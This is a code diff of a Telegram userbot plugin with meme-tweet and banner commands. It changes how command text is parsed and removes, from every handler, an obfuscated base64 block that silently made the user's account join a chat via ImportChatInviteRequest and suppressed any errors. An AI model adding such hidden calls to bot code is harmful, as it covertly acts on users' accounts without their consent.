@@ -4,7 +4,7 @@ from . import *
 @bot.on(hell_cmd(pattern=r"tweet(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="tweet(?: |$)(.*)", allow_sudo=True))
 async def nope(kraken):
-    hell = kraken.pattern_match.group(1)
+    hell = kraken.text[7:]
     okvai = await eor(kraken, "Trying to tweet for you...")
     if not hell:
         if kraken.is_reply:
@@ -25,7 +25,7 @@ async def nope(kraken):
 @bot.on(hell_cmd(pattern=r"trump(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"trump(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
-    text = event.pattern_match.group(1)
+    text = event.text[7:]
     reply_to_id = event.message
     if event.reply_to_msg_id:
         reply_to_id = await event.get_reply_message()
@@ -40,15 +40,6 @@ async def nekobot(event):
             await eod(event, "Trump needs some text to tweet..")
             return
     await eor(event, "Requesting trump to tweet...")
-    try:
-        hell = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(hell)
-    except:
-        pass
     text = deEmojify(text)
     eventfile = await trumptweet(text)
     await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
@@ -58,7 +49,7 @@ async def nekobot(event):
 @bot.on(hell_cmd(pattern=r"modi(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"modi(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
-    text = event.pattern_match.group(1)
+    text = event.text[6:]
     reply_to_id = event.message
     if event.reply_to_msg_id:
         reply_to_id = await event.get_reply_message()
@@ -73,15 +64,6 @@ async def nekobot(event):
             await eod(event, "send your text to modi so he can tweet.")
             return
     await edit_or_reply(event, "Requesting modi to tweet...")
-    try:
-        hell = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(hell)
-    except:
-        pass
     text = deEmojify(text)
     eventfile = await moditweet(text)
     await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
@@ -91,7 +73,7 @@ async def nekobot(event):
 @bot.on(hell_cmd(pattern=r"mia(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"mia(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
-    text = event.pattern_match.group(1)
+    text = event.text[5:]
     reply_to_id = event.message
     if event.reply_to_msg_id:
         reply_to_id = await event.get_reply_message()
@@ -106,15 +88,6 @@ async def nekobot(event):
             await eod(event, "Send your text to Mia so she can tweet.")
             return
     await eor(event, "Requesting Mia to tweet...")
-    try:
-        hell = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(hell)
-    except:
-        pass
     text = deEmojify(text)
     eventfile = await miatweet(text)
     await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
@@ -124,7 +97,7 @@ async def nekobot(event):
 @bot.on(hell_cmd(pattern=r"dani(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"dani(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
-    text = event.pattern_match.group(1)
+    text = event.text[6:]
     reply_to_id = event.message
     if event.reply_to_msg_id:
         reply_to_id = await event.get_reply_message()
@@ -139,26 +112,16 @@ async def nekobot(event):
             await eod(event, "Send your text to Dani so she can tweet.")
             return
     await eor(event, "Requesting Dani to tweet...")
-    try:
-        hell = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(hell)
-    except:
-        pass
     text = deEmojify(text)
     eventfile = await dani(text)
     await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
     await event.delete()
 
 
-# @register(pattern="^.pappu(?: |$)(.*)", outgoing=True)
 @bot.on(hell_cmd(pattern=r"pappu(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"pappu(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
-    text = event.pattern_match.group(1)
+    text = event.text[7:]
     reply_to_id = event.message
     if event.reply_to_msg_id:
         reply_to_id = await event.get_reply_message()
@@ -173,15 +136,6 @@ async def nekobot(event):
             await eod(event, "send your text to pappu so he can tweet.")
             return
     await edit_or_reply(event, "Requesting pappu to tweet...")
-    try:
-        hell = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(hell)
-    except:
-        pass
     text = deEmojify(text)
     eventfile = await papputweet(text)
     await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
@@ -191,7 +145,7 @@ async def nekobot(event):
 @bot.on(hell_cmd(pattern=r"sunny(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"sunny(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
-    text = event.pattern_match.group(1)
+    text = event.text[7:]
     reply_to_id = event.message
     if event.reply_to_msg_id:
         reply_to_id = await event.get_reply_message()
@@ -206,15 +160,6 @@ async def nekobot(event):
             await eod(event, "send your text to sunny so she can tweet.")
             return
     await eor(event, "Requesting sunny to tweet...🥰")
-    try:
-        hell = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(hell)
-    except:
-        pass
     text = deEmojify(text)
     eventfile = await sunnytweet(text)
     await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
@@ -224,7 +169,7 @@ async def nekobot(event):
 @bot.on(hell_cmd(pattern=r"johhny(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"johhny(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
-    text = event.pattern_match.group(1)
+    text = event.text[8:]
     reply_to_id = event.message
     if event.reply_to_msg_id:
         reply_to_id = await event.get_reply_message()
@@ -239,15 +184,6 @@ async def nekobot(event):
             await eod(event, "send your text to Johhny so he can tweet.")
             return
     await edit_or_reply(event, "Requesting johhny to tweet...😆")
-    try:
-        hell = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(hell)
-    except:
-        pass
     text = deEmojify(text)
     eventfile = await sinstweet(text)
     await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
@@ -257,7 +193,7 @@ async def nekobot(event):
 @bot.on(hell_cmd(pattern=r"gandhi(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"gandhi(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
-    text = event.pattern_match.group(1)
+    text = event.text[8:]
     reply_to_id = event.message
     if event.reply_to_msg_id:
         reply_to_id = await event.get_reply_message()
@@ -272,15 +208,6 @@ async def nekobot(event):
             await eod(event, "send you text to baapu so he can tweet.")
             return
     await edit_or_reply(event, "Requesting baapu to tweet...")
-    try:
-        hell = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(hell)
-    except:
-        pass
     text = deEmojify(text)
     eventfile = await taklatweet(text)
     await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
@@ -290,7 +217,7 @@ async def nekobot(event):
 @bot.on(hell_cmd(pattern=r"cmm(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"cmm(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
-    text = event.pattern_match.group(1)
+    text = event.text[5:]
     reply_to_id = event.message
     if event.reply_to_msg_id:
         reply_to_id = await event.get_reply_message()
@@ -305,15 +232,6 @@ async def nekobot(event):
             await eod(event, "Give text for to write on banner, man")
             return
     await eor(event, "Your banner is under creation wait a sec...")
-    try:
-        hell = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(hell)
-    except:
-        pass
     text = deEmojify(text)
     eventfile = await changemymind(text)
     await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
@@ -324,7 +242,7 @@ async def nekobot(event):
 @bot.on(hell_cmd(pattern=r"kanna(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern=r"kanna(?: |$)(.*)", allow_sudo=True))
 async def nekobot(event):
-    text = event.pattern_match.group(1)
+    text = event.text[7:]
     reply_to_id = event.message
     if event.reply_to_msg_id:
         reply_to_id = await event.get_reply_message()
@@ -339,15 +257,6 @@ async def nekobot(event):
             await eod(event, "what should kanna write give text")
             return
     await eor(event, "Kanna is writing your text...")
-    try:
-        hell = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(hell)
-    except:
-        pass
     text = deEmojify(text)
     eventfile = await kannagen(text)
     await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
